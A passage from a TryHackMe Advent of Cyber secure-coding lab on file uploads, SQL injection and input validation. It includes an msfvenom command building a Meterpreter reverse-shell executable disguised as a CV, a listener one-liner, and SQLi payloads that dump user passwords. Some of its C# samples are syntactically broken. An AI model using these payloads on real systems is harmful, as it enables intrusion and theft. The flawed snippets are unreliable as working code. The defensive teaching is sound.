`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT="Listening port" -f exe -o cv-username.exe`

You can then also use the following to create the associated listener in the msfconsole:

`sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 'listening port'; exploit"`  

Once we have our CV, we can upload the file again. Once uploaded, give it a few minutes, and one of those elves should be reviewing our CV:

```
[*] Started reverse handler on 10.50.1.120:4444 [*] Starting the payload handler... [*] Sending stage (770048 bytes) to 10.10.1.20 [*] Meterpreter session 1 opened (10.50.1.120:4444 -> 10.10.1.20:1138) at 2022-10-22 19:03:43 -0500 meterpreter >
```

This is sufficient for a proof of concept for Elf McSkidy to take to Santa and request that additional security controls must be implemented on the application! Using your shell, go read the flag from the specific elf's home directory.

Properly Securing File Uploads

To adequately secure the file upload feature, we will need to implement layers of defence. In this task, we will use a C# file upload as the case study. C# is a popular language used to create both Windows application and web applications at large organisations. Let's look at our base file upload function first:

Upload.cshtml  

```csharp
public IActionResult OnPostUpload(FileUpload fileUpload)
    {   
        var fullPath = "D:\CVUploads\"
        var formFile = fileUpload.FormFile;
        var filePath = Path.Combine(fullPath, formFile.FileName);

        using (var stream = System.IO.File.Create(filePath))
            {
                formFile.CopyToAsync(stream);
            }
    }
```

As we can see, the developer made sure to store the CV outside the web root by setting the full path to a different drive (D:\CVUploads). However, this is not sufficient. Let's take a look at what additional controls can be implemented:

File Content Validation

We can validate the content of the file by reviewing the ContentType header that is sent by the browser when a file is uploaded:

Upload.cshtml  

```csharp
string contentType = fileUpload.ContentType.Split('/')[1].ToLower();
if !(contentType.equals("ContentType=PDF")
    {
        allowed = False;
    }
```

If the file content type is not PDF, we will reject the file. While this is a good control, it should be noted that since the browser sets this header, an attacker could bypass this control by intercepting the request and changing the header.

File Extension Validation

We can also verify the file extension. This will allow us to limit the type of files that can be uploaded. We can therefore add the following lines to our code:

Upload.cshtml  

```csharp
string contentExtension = Path.GetExtension(fileUpload);
if !(contentExtension.equals("PDF"))
    {
        allowed = False;
    }
```

This will limit the file types to only PDFs. If a user's CV is in a different format, they will have to convert their CV first. This control should ideally be implemented with an allowlist, as shown above, since a blocklist can still be bypassed in certain cases.

File Size Validation

Attackers can also try to upload files that are so large it consumes so much disk space that other potential candidates are not able to upload their CVs. To prevent this, we can implement file size validation controls:

Upload.cshtml  

```csharp
int contentSize = fileUpload.ContentLength;
//10Mb max file size
int maxFileSize = 10 * 1024 * 1024
if (contentSize > maxFileSize)
    {
        allowed = False;
    }
```

This will only allow file sizes smaller than the specified amount.

File Renaming

As mentioned before, even though our uploads are stored outside the web root, an attacker could leverage an additional vulnerability, such as file inclusion, to execute the file. To counter these attempts, we can look to rename uploaded files to random names, making it almost impossible for an attacker to recover their file by name:

Upload.cshtml  

```csharp
Guid id = Guid.NewGuid();
var filePath = Path.Combine(fullPath, id + ".pdf");
```

Malware Scanning

Even with all of the above controls implemented, there is still the risk of an attacker uploading a malicious file that targets the elves that will review the CVs. Since Santa is a high-value individual, some nation-states might even use specialised exploits found in PDF readers to upload a malicious PDF in the hopes of getting access to remove themselves from Santa's naughty list! In order to combat these types of malicious files, we can scan uploaded files for malware. We can install a package such as ClamAV and use it to scan the contents of each uploaded file:

Upload.cshtml  

```csharp
var clam = new ClamClient(this._configuration["ClamAVServer:URL"],Convert.ToInt32(this._configuration["ClamAVServer:Port"])); 
var scanResult = await clam.SendAndScanFileAsync(fileBytes);  
  
if (scanResult.Result == ClamScanResults.VirusDetected)
    {
        allowed = False;
    }; 
```

Putting it all Together

Combining all of the above techniques, we can implement a secure file upload function, as shown below:

Upload.cshtml  

```csharp
public IActionResult OnPostUpload(FileUpload fileUpload)
    {
        var allowed = True;

        //Store file outside the web root   
        var fullPath = "D:\CVUploads\"

        var formFile = fileUpload.FormFile;

        //Create a GUID for the file name
        Guid id = Guid.NewGuid();
        var filePath = Path.Combine(fullPath, id + ".pdf");

        //Validate the content type
        string contentType = fileUpload.ContentType.Split('/')[1].ToLower();
        if !(contentType.equals("ContentType=PDF")
            {
                allowed = False;
            }

       //Validate the content extension
       string contentExtension = Path.GetExtension(fileUpload);
       if !(contentExtension.equals("PDF"))
           {
               allowed = False;
           }

       //Validate the content size
       int contentSize = fileUpload.ContentLength;
       //10Mb max file size
       int maxFileSize = 10 * 1024 * 1024
       if (contentSize > maxFileSize)
           {
               allowed = False;
           }

       //Scan the content for malware
       var clam = new ClamClient(this._configuration["ClamAVServer:URL"],Convert.ToInt32(this._configuration["ClamAVServer:Port"])); 
       var scanResult = await clam.SendAndScanFileAsync(fileBytes);  
  
       if (scanResult.Result == ClamScanResults.VirusDetected)
           {
                allowed = False;
           };

       //Only upload if all checks are passed
       if (allowed)
       {
            using (var stream = System.IO.File.Create(filePath))
                {
                    formFile.CopyToAsync(stream);
                }
       }

### [Day 16] Secure Coding SQLi’s the king, the carolers sing

                       The Story

![AoC day 16 banner](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/67234c28fa6771b3c6d6e39260be4c3e.png)

Check out InsiderPhD's video walkthrough for Day 16 [here](https://www.youtube.com/watch?v=iv02-Oi0TvM)!  

Set to have all their apps secured, the elves turned towards the one Santa uses to manage the present deliveries for Christmas. Elf McSkidy asked Elf Exploit and Elf Admin to assist you in clearing the application from SQL injections. When presented with the app's code, both elves looked a bit shocked, as none of them knew how to make any sense of it, let alone fix it. **"We used to have an Elf McCode, but he founded a startup and helps us no more"**, said Admin.

After a bit of talk, it was decided. The elves returned carrying a pointy hat and appointed you as the new Elf McCode. Congratulations on your promotion!

Deploying the Virtual Machine

During this task, you'll use a Virtual Machine (VM) where all the tools you need are already installed. The instructions on what is available and how to use it will be provided further ahead. Since the VM takes a couple of minutes to start, it might be a good idea to click the `Start Machine` button on the top-right corner of this task now. To access the contents in the machine, you will only need your browser (you won't need the AttackBox or VPN for this one).

SQL Refresher

**Structured Query Language (SQL)** is the traditional language used to ask databases for information. When you build any application that relies on a database, the app will need to create SQL sentences on the fly and send them to the database engine to retrieve the required information for your app to work. Luckily for you, SQL was built with simplicity in mind, and its syntax is supposed to resemble straightforward English sentences to make it easier for programmers to understand.

But before explaining the SQL syntax, let's talk about the specific database engine used on our app: MySQL. MySQL stores information in structures called tables. Think of them as any table in a spreadsheet document where you have **columns** and **rows**. For clarity, let's check one of the tables in use in the current application where the toys are stored:

![A database table](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/bd97758d1b832dcbbaa1f8d68ae98650.png)  

As you can see, each row of the table corresponds to a different toy, and each column is a **field** of data that describes the toy. Looking at the third row, we can see that our toys table contains a toy named "Car" and that there are 12 units available for it. Pretty easy.  

As mentioned before, when an app needs to retrieve information from the database, it will need to build an **SQL query**. Queries are simple instructions that ask for specific data in a structured way that the database can understand. To query information, we will use **SELECT** statements, indicating which rows of which table we want to retrieve. If we wanted to get all of the columns from the "toys" table in our database, we could use the following statement:

```sql
SELECT * FROM toys;
```

![Simple select query](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b149b3ba14bf78a737f26772d0f8c7e5.png)  

Notice the asterisk(*), which indicates that you want to retrieve all columns from the table. If you need to ask for specific columns, you can replace the asterisk with a comma-separated list of columns. For example, to retrieve only the name and quantity columns, you can issue the following SQL query:

```sql
SELECT name, quantity FROM toys;
```

![select specific columns](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/cea1fa400777acd81f95e5b95ebb6054.png)  

All table rows are returned in both cases before, but you can filter those if needed using a **WHERE** clause. Suppose you want to filter the results of the last query so that you only get the toys for which there is at least a quantity of 20. You could do so with the following statement:

```sql
SELECT name, quantity FROM toys WHERE quantity >= 20;
```

![Using WHERE filters](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/bcf89fa6f3dd293c319d29f19bfdb694.png)  

In real-world apps, you are likely to find much more complex queries in some cases, but what we've covered so far should be enough for the rest of the room.

Sending SQL Queries from PHP

Now that we understand how a SELECT statement works, let's see how a PHP application builds and sends such a query to MySQL. Although we are focusing on PHP and MySQL, the same idea generally applies to other programming languages.

The first step is always to get a connection to the database from our code. To do so, PHP includes the **mysqli** extension, which provides the `mysqli_connect()` function. The function receives the IP or name of the database server as a first parameter (`$server`), followed by the username (`$user`) and password (`$pwd`), and finally, the name of the schema to use(`$schema`), which is just an identifier of the database to which we are connecting. As a result, the function returns a connection handler, which can be used to send further SQL Queries. Think of the connection handler as a variable that holds the connection information to the database, so that queries can be sent to it:

```php
$server="db";
$user="logistics_user";
$pwd="somePass123";
$schema="logistics";

$db=mysqli_connect($server,$user,$pwd,$schema);
```

Once the connection is made, we can issue SQL queries using the `mysqli_query()` function. The first parameter we pass to the function is the connection handler we got before, and the second parameter is a string with our SQL query:

```php
$query="select * from users where id=1";
$elves_rs=mysqli_query($db,$query);
```

As a result of executing the query, we obtain an SQL result set and store it in the `$elves_rs` variable in our example. A result set is nothing more than an object that contains the results of our query, which can be used in the rest of our program to access the resulting data.

As you can see, it is all as easy as building a string with our query and sending it to the database! 

Building Dynamic Websites

Now here's where things get interesting. If you check Santa's web application, you can access an elf's profile by using a URL like this:

[http://LAB_WEB_URL.p.thmlabs.com/webapp/elf.php?id=2](http://lab_web_url.p.thmlabs.com/webapp/elf.php?id=2)

![Elf McSkidy Profile](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/14c35693f57e1001f03b84eaafab91c2.png)  

Depending on the number you put on the `id` parameter of the URL, you get served the profile of a different elf. Behind the curtains, this works by creating an SQL query that embeds the `id` parameter value and returns the information on the corresponding elf.

![Building dynamic queries](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a8f7cb56f722249c4e453f3de2c072c3.png)  

In code, it would look like this:

```php
$query="select * from users where id=".$_GET['id'];
$elves_rs=mysqli_query($db,$query);
```

The first line builds an SQL query by concatenating the `$_GET['id']` variable as part of the where clause. Note that in PHP, you can access any parameter in the URL as `$_GET['name_of_parameter']`. This query will ask the database for all columns of the table users that correspond to the elf with a specific id. The second line sends the query and returns the information of one particular elf as a result set that we store in the `$elves_rs` variable. The rest of the website then parses the result set and renders the page accordingly.

If you test the website, you can see that it works as expected. You have, however, introduced an SQL injection vulnerability in your code that could allow an attacker to dump your whole database!

SQL Injection (SQLi)

The problem with the method shown before is that it takes untrusted input from the user and concatenates it to an SQL query without any questions asked. As seen in the previous day's task, our app should thoroughly validate any input the user sends before using it. If it doesn't, unexpected things may happen.

In the case of SQL and our example, an attacker can send SQL syntax through one of the various parameters of the app's URLs, which might end up being concatenated to some SQL query in code, potentially changing its intended purpose.

Let's get back to the elf's profile page to understand this better. Remember the application is creating a query by concatenating whatever is sent in the `id` parameter as part of the WHERE clause:

```php
$query="select * from users where id=".$_GET['id'];
```

If the attacker sends the following through the id parameter of the URL:

[http://LAB_WEB_URL.p.thmlabs.com/webapp/elf.php?id=-1 OR id = 4](http://lab_web_url.p.thmlabs.com/webapp/elf.php?id=-1%20OR%20id%20=%204)

When PHP concatenates "-1 OR id = 4" to our SQL statement, it will end up with this query:

```sql
select * from users where id=-1 OR id = 4
```

Suddenly, the attacker has injected some SQL syntax that, when concatenated to our original query, ends up serving the data of the elf with `id=4` for some weird reason.

![SQL injection 101](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9172c99c0a762ac5500956cdf0f04629.png)  

If we read the resulting query string, we can see that our WHERE clause was modified to filter only the elves that either have `id=-1` or `id=4`. Since the id values used by the database are likely all positive numbers, no elf will match `id=-1`. Therefore, the database will only return the elf with `id=4`.

While this example shows a harmless injection, a skilled attacker can try to get your server to run much more complex SQL queries and potentially force the database to return any data on any table they want. Just as an example, look at what happens when you put the following in the `id` parameter:

[http://LAB_WEB_URL.p.thmlabs.com/webapp/elf.php?id=-1 union all select null,null,username,password,null,null,null from users](http://lab_web_url.p.thmlabs.com/webapp/elf.php?id=-1%20union%20all%20select%20null,null,username,password,null,null,null%20from%20users)

The SQL injected will make the database return all of the users and passwords of the application. Santa won't like this, for sure! If you are interested in learning more about SQL injection from an attacker's perspective, you can check the [SQL injection room](https://tryhackme.com/room/sqlinjectionlm). For the rest of this task, however, we will focus on the defensive side and look at ways to prevent SQL injections in our code, so don't worry too much if the above URL looks hard to understand.

Fixing the App With Elf Exploit and Elf Admin

Armed with all this knowledge, we are ready to fix the app. You'll have access to a simple editor to modify the app's source code during this task. Any changes you make in the editor will go live instantly as long as you save your changes (by pressing `CTRL+S`). If you are using the VPN connection, you can access the code editor from any browser of your preference. If you use the AttackBox instead, Firefox is installed and available on the machine's desktop. To get to the code editor, point your browser to the following address:

[http://LAB_WEB_URL.p.thmlabs.com/](http://lab_web_url.p.thmlabs.com/)

To enter the code editor, use the following credentials:

![THM key](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f8eb6e78ad80791f4c2bc42c421364ba.png)

**Username**

**Password**

In addition to the code editor, you will have access to a chat to communicate with Elf Exploit and Elf Admin. While they don't speak too much, you can request them to check the application for you. If you remember correctly, they don't know a thing about coding. However, Elf Exploit will help you identify parts of the app that are vulnerable to SQLi. Elf Admin, on the other hand, will check that the application is running as expected, so if you make a change that breaks the application somehow, he will let you know so you can roll back and try again. In combination, they will tell you if your changes solve vulnerabilities while avoiding altering how the app is supposed to work.

![Code Editor Layout](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d25e248ac1ab1791a6316451ce65ab2f.png)  

To ask the elves to do a recheck of the app, scroll down the elf chat to find the Run Checks button:

![Run Checks Button](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5d7f03c0848004a911875745dd0ca88e.png)  

Remember that you can always check the website after any changes by visiting the following link:

[http://LAB_WEB_URL.p.thmlabs.com/webapp/](http://lab_web_url.p.thmlabs.com/webapp/)

Now let's get to work!

Fixing SQLi by Data Type Validation

One of the easiest and most effective ways to prevent SQL injections is to ensure that any data that the user can manipulate that you are concatenating as part of an SQL statement is actually from the type you expect. Let's go to our elf chat and click the **Run Checks** button.

Elf Exploit should tell you that he successfully injected some SQL via the id parameter of `elf.php`. Let's open this file in our code editor and look at lines 4-5:

```php
$query="select * from users where id=".$_GET['id'];
$elves_rs=mysqli_query($db,$query);
```

The website takes the `id` parameter from the URL and concatenates it to an SQL query, as shown before.

We can reasonably assume that the website expects an integer `id` to be sent. To avoid injections, we can convert whatever the user inputs in the id parameter to an integer. For this purpose, we will be using the `intval()` function. This function will take a string and try to convert it into an integer. If no valid integer is found on the string, it will return 0, which is also an integer. To clarify this, let's look at some values and how they would be converted:

```php
intval("123") = 123
intval("tryhackme") = 0
intval("123tryhackme") = 123
```

Putting this to use, we can modify line 4 of `elf.php` to look like this:

```php
$query="select * from users where id=".intval($_GET['id']);
```

That way, even if the attacker sends an SQL injection payload via the id parameter, the app will try converting it to an integer before concatenating it as part of the SQL statement. In the worst-case scenario, the string gets converted to a 0, which is still harmless in this particular case.

Make sure to press `CTRL+S` to save your changes on the document, and ask the elves to recheck the app. This time Elf Exploit will again tell you he can inject SQL, but in a different way. This happens because the `id` parameter is used twice in `elf.php` to form two separate SQL queries: one to get the elf's information and another to get any toys built by them. Find where this happens and fix the vulnerability. Once you do, ask the elves to recheck, and if your fix is correct, you'll get the first flag.

Notice that for most data types, you will be able to make something similar. If you expect to receive a float number, you can use `floatval()` just the same. Even if values are not numeric but follow some specific structure, you could implement your own validators to ensure that data conforms with a given format. Think, for example, of a parameter used to send IP addresses. You could quickly implement a simple function to check if the IP is well formed and opt not to run the SQL query if it isn't.

Fixing SQLi Using Prepared Statements

While in some cases, you may secure your code with a simple validator, there are situations where you need to allow the user to pass arbitrary strings through a parameter. One example of this can be seen in the search bar of our application.

Every time a search is done, it gets sent to search-toys.php via the `q` parameter. If you ask the elves to recheck the application right now, Elf Exploit should have a way to take advantage of a vulnerability in that parameter. If we open `search-toys.php` in our code editor, we can quickly see that a query is built in lines 4-5:

```php
$query="select * from toys where name like '%".$_GET['q']."%' or description like '%".$_GET['q']."%'";
$toys_rs=mysqli_query($db,$query);
```

Here, the `q` parameter gets concatenated twice into the same SQL sentence. Notice that in both cases, the data in `q` is wrapped around single quotes, which is how you represent a string in SQL. The problem with having PHP build the query is that the database has no other option but to trust what it is being given. If an attacker somehow injects SQL, PHP will blindly concatenate the injected payload into the query string, and the database will execute it.

![Building SQL Query by Concatenation](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/94464c2dd10b21b108fe9b5fa5ed24f0.png)  

While there are a couple of ways to go about this, the safest bet is to use prepared statements to prevent SQL injections.  

**Prepared statements** allow you to separate the syntax of your SQL sentence from the actual parameters used on your WHERE clause. Instead of building a single string by concatenation, you will first describe the structure of your SQL query and use placeholders to indicate the position of your query's parameters. You will then bind the parameters to the prepared statement in a separate function call.

![Building SQL Queries via Prepared Statements](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b03ab555f94e432238a260e3557fb492.png)  

Instead of providing a single SQL query string, we will send any dynamic parameters separately from the query itself, allowing the database to stick the pieces together securely without depending on PHP or the programmer. Let's see how this looks in the code.

First, we will modify our initial query by replacing any parameter with a placeholder indicated with a question mark (`?`). This will tell the database we want to run a query that takes two parameters as inputs. The query will then be passed to the `mysqli_prepare()` function instead of our usual `mysqli_query()`. `mysqli_prepare()` will not run the query yet but will indicate to the database to prepare the query with the given syntax. This function will return a prepared statement.

```php
$query="select * from toys where name like ? or description like ?";
$stmt = mysqli_prepare($db, $query);
```

To execute our query, MySQL needs to know the value to put on each placeholder we defined before. We can use the `mysqli_stmt_bind_param()` function to attach variables to each placeholder. This function requires you to send the following function parameters:

The first parameter should be a reference to the prepared statement to which to bind the variables. 

The second parameter is a string composed of one letter per placeholder to be bound, where letters indicate each variable's data type. Since we want to pass two strings, we put `"ss"` in the second parameter, where each "s" represents a string-typed variable. You can also use the letters "i" for integers or "d" for floats. You can check the full list in [PHP's documentation](https://www.php.net/manual/en/mysqli-stmt.bind-param.php).

After that, you will need to pass the variables themselves. You must add as many variables as placeholders defined with `?` in your query, which in our case, are two. Notice that, in our example, both parameters have the same content, but in other cases, it may not be so.

The resulting code for this would be as follows:

```php
$q = "%".$_GET['q']."%";
mysqli_stmt_bind_param($stmt, 'ss', $q, $q);
```

Once we have created a statement and bound the required parameters, we will execute the prepared statement using `mysqli_stmt_execute()`, which receives the statement `$stmt` as its only parameter.

```php
mysqli_stmt_execute($stmt);
```

Finally, when a statement has been executed, we can retrieve the corresponding result set using the `mysqli_stmt_get_result()`, passing the statement as the only parameter. We'll assign the result set to the `$toys_rs` variable as in the original code.

```php
$toys_rs=mysqli_stmt_get_result($stmt);
```

Our final resulting code should look like this:

```php
$q = "%".$_GET['q']."%";
$query="select * from toys where name like ? or description like ?";
$stmt = mysqli_prepare($db, $query);
mysqli_stmt_bind_param($stmt, 'ss', $q, $q);
mysqli_stmt_execute($stmt);
$toys_rs=mysqli_stmt_get_result($stmt);
```

Be sure to save your changes by using `CTRL+S`. If you ask the elves to recheck the app, they should now tell you the vulnerability has been fixed and give you the second flag.

Finishing the Job

There are still some SQLi vulnerabilities to be fixed in the code. Using the help of Elf Exploit and Elf Admin and the knowledge we have gained, secure the remaining vulnerabilities to get more flags. Good luck!

                       The Story  

![Banner for Day 17](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/d05e1c8db9484ef8201231659ce26b0d.png)

Check out InsiderPhD's video walkthrough for Day 17 [here](https://www.youtube.com/watch?v=ZsmRQqjGb9E)!  

After handling unrestricted file uploads and SQLi vulnerabilities, McSkidy continued to review Santa's web applications. She stumbled upon user-submitted inputs that are unrecognizable, and some are even bordering on malicious! She then discovered that Santa's team hadn't updated these web applications in a long time, as they clearly needed more controls to filter misuse. Can you help McSkidy research and learn a useful technique to handle that in the future? 

Introduction

At this point, we are already well aware of the security concerns regarding input validation. Analogous to being the castle wall of your application that forms the first line of defense against an array of scenarios from harmless misuse to outright malicious intents, validating input merits the same effort as its medieval counterpart in terms of its hardening.

It goes without question that insufficient effort in this space may result in attack vectors being vulnerable and consequently exploited in your application. Day 15 talked about input validation in light of Unrestricted File Upload, while Day 16 focused on SQLi.

In this task, we will be exploring input validation in a more general sense before touching upon one of its most complex use cases: free-form text fields, followed by a quick discussion on how you may move forward in your secure coding journey beyond input validation.

Input Validation Foundations

Generally, an effective way to validate input is first to know how a specific piece of data is going to be processed by the rest of your application. The Day 15 task is a beautiful example that shows more or less the mindset required to be able to effectively tackle the specific case of Unrestricted File Upload.

Data then goes through syntax and semantic validation checks to ensure that the user-provided values are both proper in their syntax (the answer follows the proper context asked by the question) and logical value (the values make sense for the question).

Going back to Day 15:

1.  You cannot  manually type your CV in the input field - the form asks for a file, so it’s simply not what’s being asked
2.  You cannot just upload any file - it should follow a set of very specific rules, the implementation of which was all discussed in the latter parts of the task.

Then comes whitelisting, where you can be very specific with what your forms would accept and immediately strip or even drop the ones that don’t fit in the predefined allowed category.

HTML5 and Regex

HTML5’s built-in features help a lot with the validation of user-provided input, minimizing the need to rely on JavaScript for the same objective. The `<input>` element, specifically has an array of very helpful capabilities centered around form validation.

For instance, the `<input>` type, which can be set to specifically filter for an email, a URL, or even a file, among others, promptly checks whether or not the user-provided input fits the type of data that the form is asking for, and so, feedback on its validity is immediately returned to the user as a result.

For even more granular control of the input being provided, regular expressions (regex) can be integrated into the mix. Simply use it in the "pattern" attribute within the `<input>` element, and you’re all set. [Here](https://www.regular-expressions.info/quickstart.html) is a nice resource to get started with regular expressions. A couple of examples are shown below.

`1. <input type="text" id="uname" name="uname" pattern="[a-zA-Z0-9]+">   2. <input type="email" id="email" name="email" pattern=".+@tryhackme\.com">`

The pattern in the first line of code above is easily one of the most foundational regular expression patterns one can use. The instruction here is to match any strings specifically composed of only letters and numbers - an alphanumeric pattern that is case-insensitive.

The pattern in the second line of code above is a bit more pointed in its instruction, specifying that an email can have any characters at the beginning as long as it ends with "@tryhackme.com".

Developing regular expressions can be very daunting as its nature is complex; however its capability to match very specific patterns is what makes it special. Well-built regular expressions introduce a great way to immediately filter out user-provided input that doesn't fit the specific requirements that you have set. 

Regex 101

This section will talk about some regex tips to get you started. To match _any lowercase_ character from the English alphabet, the regex pattern is `[a-z]`. We can deconstruct it as follows:

-   The square brackets indicate that you're trying to match _one character_ within the set of characters inside of them. For example, if we're trying to match any vowel of the English alphabet, we construct our regex as follows: `[aeiou]`. The order of the characters doesn't matter, and it will match the same.
-   Square brackets can also accept a range of characters by adding a hyphen, as seen in our original example.
-   You can also mix and match sets of characters within the bracket. `[a-zA-Z]` means you want to match any character from the English alphabet regardless of case, while `[a-z0-9]` means you want to match any lowercase alphanumeric character.

We also need to talk about regex operators. The simplest one is the wildcard operator, denoted by `.` . This means regex will match _any_ character, and it's quite powerful when used with the operators `*`, `+`, and `{min,max}`. The asterisk or star operator is used if you don't care if the preceding token matches anything or not, while the plus operator is used if you want to make sure that it matches at least once. The curly braces operator, on the other hand, specifies the number of characters you want to match. Let's look at the following examples:

-   To match a string that is alphanumeric and case insensitive, our pattern would be `[a-zA-Z0-9]+`. The plus operator means that we want to match a string, and we don't care how long it is, as long as it's composed of letters and numbers regardless of their case.
-   If we want to ensure that the first part of the string is composed of letters and we want it to match regardless if there are numbers thereafter, it would be `^[a-zA-Z]+[0-9]*$`. The `^` and `$` operators are called anchors, and denote the start and end of the string we want to match, respectively. Since we wanted to ensure that the start of the string is composed of only letters, adding the caret operator is required.
-   If we want to match just lowercase letters that are in between 3 and 9 characters in length, our pattern would be `^[a-z]{3,9}$`.
-   If we want a string that starts with 3 letters followed by _any_ 3 characters, our pattern would be `^[a-zA-Z]{3}.{3}$`.

There's also the concept of grouping and escaping, denoted by the `()` and the `\` operators, respectively. Grouping is done to manage the matching of specific parts of the regex better while escaping is used so we can match strings that contain regex operators. Finally, there's the `?` operator, which is used to denote that the preceding token is optional. Let's look at the following example:

-   If we want to match both _www.tryhackme.com_ and _tryhackme.com_, our pattern would be `^(www\.)?tryhackme\.com$`. This pattern would also avoid matching _.tryhackme.com._
-   `^(www\.)?`: The `^` operator marks the start of the string, followed by the grouping of www and the escaped `.`, and immediately followed by the question mark operator. The grouping allowed the question mark operator to work its magic, matching both strings with or without the _www._ at the beginning.
-   `tryhackme\.com$`: The `$` operator marks the end of the string, preceded by the string tryhackme, an escaped `.`, and the string com. If we don't escape the `.` operator, the regex engine will think that we want to match any character between tryhackme and com as well.

It's also imperative to note that the wildcard operator can lead to laziness and, consequently misuse. As such, it's always better to use character sets through the brackets especially when we're validating input as we want it to be perfect.

Here's a table to summarize everything above:

[]

Character Set: matches any single character/range of characters inside

.

Wildcard: matches any character

*

Star / Asterisk Quantifier: matches the preceding token zero or more times

+

Plus Quantifier: matches the preceding token one or more times

{min,max}

Curly Brace Quantifier: specifies how many times the preceding token can be repeated

()

Grouping: groups a specific part of the regex for better management

\

Escape: escapes the regex operator so it can be matched

?

Optional: specifies that the preceding token is optional

^

Anchor Beginning: specifies that the consequent token is at the beginning of the string

$

Anchor Ending: specifies that the preceding token is at the end of the string

The Unique Case of Free-Form Text

All of the techniques that we have covered in this task thus far are mainly concerned with structured data - data that we already expect what it should look like. However, compared to the validation of structured data, free text is more complex and not very straightforward.  

Structured data have inherent characteristics that allow us to set them apart quite quickly. For example, names shouldn’t consist of special characters (some names have, but these can be whitelisted), and age should only consist of numbers with an absolute maximum of 3 characters. Syntax and semantic validation checks can be immediately done on them, and the chaos suddenly doesn’t seem too bad.

In contrast, free text fields are more free-for-all, and so validations checks are more limited, and the challenge of securing it is generally vaguer. Yet, like all great engineers before us, we power through these challenges and make the best with what we’re given. Listed below are some considerations to ponder on.

-   First, we start again with the question of how this piece of data is going to be processed by the rest of the application.
-   What will be the context for which this free-form text field will be used? Free text fields for blog posts are tackled very differently than text fields used for a small comment section or a descriptive text field.
-   Is the free text field necessary for your business purposes in the first place, or could it be implemented differently while still achieving the same goal? This is essential to know, too, as part of writing secure code is avoiding writing vulnerable ones!

Then we go to the tricky part. Since syntax and semantic checks are pretty much impossible due to the nature of free-form text fields, our best bet in having a bit of control is through whitelisting. This [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html#validating-free-form-unicode-text) lists down the general techniques to perform whitelisting, which can be summarized as follows:

1.  Ensure no invalid characters are present through proper encoding, and
2.  Whitelist expected characters and character sets

Best Remediation Tactic  

For the next part of the discussion, let’s take a look at the simple base code below wherein a programmer attempts to retrieve the usual details from a user.

![Base Code](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/944be37798d52b534749b314d6c90849.png)  

The example is a bit bare and would have been an immediate nightmare as it raises many alarms not only in terms of security, but also in terms of risking getting a ton of garbage responses. Since all of them are text inputs by default, the birthday and age fields may receive responses that aren’t within their specific context. Further, malicious users have free reign over the fields, essentially allowing them a free playground to tinker with.

This is the case if no input validation is done at all. Let’s fix it up a bit and review it again.

![Edited Base Code to Include Type Attribute](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/a7484e2056785655394786a397857a5f.png)  

The changes above are literally just additions of the _type_ attribute and their corresponding values within the input element. Yet, there’s already a world of difference between this one and the base implementation prior. Take note that security wasn’t the main focus of these changes, yet it succeeds in mainly alleviating the chaos that the prior implementation otherwise invited. Going back to the discussion above, this is an example of the syntax check being done in the HTML layer.

However, the implementation above is still susceptible to misuse, especially for very naughty users. Let’s fix it up further and review it again.

![Further Edit of Base Code to Include Semantic and Whitelisting Techniques](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/4b0203a837d72f92684f35c8bd1d00b6.png)  

The changes done above incorporate both semantic checking and whitelisting techniques to the existing syntax checking in the prior implementation in order to further filter out allowed values that can be provided in the input fields.

1.  The name field, for instance, has been written to allow a maximum of 70 characters - still quite long but somewhat reasonable. This can further be filtered granularly by blacklisting numbers and special symbols, but for our purposes, let’s accept this one for now.
2.  The date field is tweaked, so the earliest date it would allow is in the year 1900, while the latest date is in 2014, with the working assumption that the youngest user of the website would be eight years old.
3.  The email field has also been revamped to only accept tryhackme emails, while the URL field is further narrowed down to only accept tryhackme rooms as the answer to the ‘favewebsite’ field.

These semantic checks should follow the proper business context to be effective. For example, the implementation above is geared towards the tryhackme staff, marked by the email field only accepting tryhackme emails. Furthermore, applying the foundations of input validation not only ensures that the data being provided is proper, but it also drastically limits the attack surface of the input fields, especially those requiring structured data.

This is the reason why we haven’t touched the `<textarea>` field at the very end of the code block. As discussed earlier, free-form text is unique in such a way that applying syntax and semantic checks are pretty much impossible. In order to secure this one, we would first need to define what content (e.g. characters, character sets, symbols, etc.) is acceptable and then perform the actual whitelisting. Even then, it wouldn’t be enough as it’s still a very open field, and so techniques such as output escaping and using parametrized queries, among others, should be implemented as well.

Client-side vs Server-side

Our discussion until this point has been geared towards using input validation to ensure that the pieces of data that we're getting from the users are not garbage. Proper input validation on the client-side limits misuse and minimizes the attack surface of the application, however, it doesn't actively cover malicious use cases.  

As opposed to the above examples of validating input implemented on the client-side, output escaping and using parametrized queries are implemented on the server-side, adding computational load to the server, but ultimately helping in securing the application as a whole. This is done as an exercise of inherent distrust in the user-provided input despite validation. 

The example below uses the built-in `htmlentities()` PHP function to escape any character that can affect the application.

`$name = htmlentities($_GET['name'], ENT_QUOTES | ENT_HTML5, "UTF-8")`

